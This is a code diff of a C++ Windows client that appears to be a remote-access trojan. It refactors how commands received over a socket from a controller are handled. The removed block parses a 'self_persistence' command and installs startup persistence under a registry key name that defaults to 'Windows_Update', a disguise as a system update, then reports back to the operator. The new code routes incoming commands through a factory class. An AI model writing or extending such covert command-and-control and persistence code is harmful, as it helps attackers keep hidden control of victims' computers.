@@ -1,4 +1,4 @@
-#include "pch.h"
+//#include "pch.h"
 #include "Client.h"
 #pragma warning(disable:4996) 
 #define SIZE_BUFFER 256
@@ -66,64 +66,13 @@ bool Client::send_b(const char* pbuffer)
 		return 0;
 }
 
-std::vector<std::string> split(const char* buffer)
-{
-	std::string s = std::string(buffer);
-	std::vector<std::string> args;
-	const std::string delimiter = " ";
-	unsigned short pos = 0;
-	auto start = 0U;
-	auto end = s.find(delimiter);
-	while (end != std::string::npos)
-	{
-	//	std::cout << s.substr(start, end - start) << std::endl;
-		args.push_back(s.substr(start, end - start));
-		std::cout << "Args " << args[pos] << std::endl;
-		start = end + delimiter.length();
-		end = s.find(delimiter, start);
-	}
-	args.push_back(s.substr(start, end));
-	//std::cout << s.substr(start, end);
-	return args;
-}
-void Client::compare(char* pbuffer)
-{	
-	
-	std::vector<std::string> args = split(pbuffer);
-	for (int iargs = 0; iargs < args.size(); iargs++)
-	{
-		std::cout << "args " << iargs << " : "<< args[iargs] << std::endl;
-
-	}
-	if (args[0] == "self_persistence")
-	{
-		std::string keyname;
-		try
-		{
-			keyname = args[1];
-		}
-		catch (std::exception &e)
-		{
-			keyname = "Windows_Update";
-		}
-		std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
-		std::wstring wstr = conv.from_bytes(keyname);
-		send_b("Putting persistence with keyname : ");
-		send_b(keyname.c_str());
-		Auto::persistence(wstr.c_str());
-	}
-
-	
-	
-}
-
 bool Client::recv_b()
 {
 	char b[SIZE_BUFFER] = { 0 };
 	if ((recv(*(this->getSock()), b, sizeof(b), 0) > 0))
 	{
 		this->setBuffer(b);
-		compare(b);
+		Factory_Client fact(this->getSock(), b);
 		Sleep(300);
 		return 1;
 	}
